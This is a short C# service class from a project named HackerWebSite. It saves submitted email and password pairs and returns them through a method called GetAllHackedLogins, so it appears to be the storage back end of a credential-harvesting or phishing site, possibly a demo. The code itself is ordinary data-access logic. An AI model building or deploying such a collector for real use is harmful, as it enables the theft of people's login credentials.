using HackerWebSite.DAL;
using Microsoft.AspNetCore.Mvc;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace HackerWebSite.Data
{
    public class SaveCookiesService
    {

        public Task<List<LoginDTO>> GetLoginAsync()
        {
            List<LoginDTO> loginDToList = new List<LoginDTO>();
            LoginDAL loginDAL = new LoginDAL();
            loginDToList = loginDAL.GetAllHackedLogins();
            return Task.FromResult(loginDToList);
        }

        public Task<bool> PostLoginAsync(string email, string password)
        {
            LoginDTO loginDTO = new LoginDTO() { Email = email, Password = password};
            LoginDAL loginDAL = new LoginDAL();
            loginDAL.PostLoginDetails(loginDTO);

            return Task.FromResult(true);
        }

    }
}
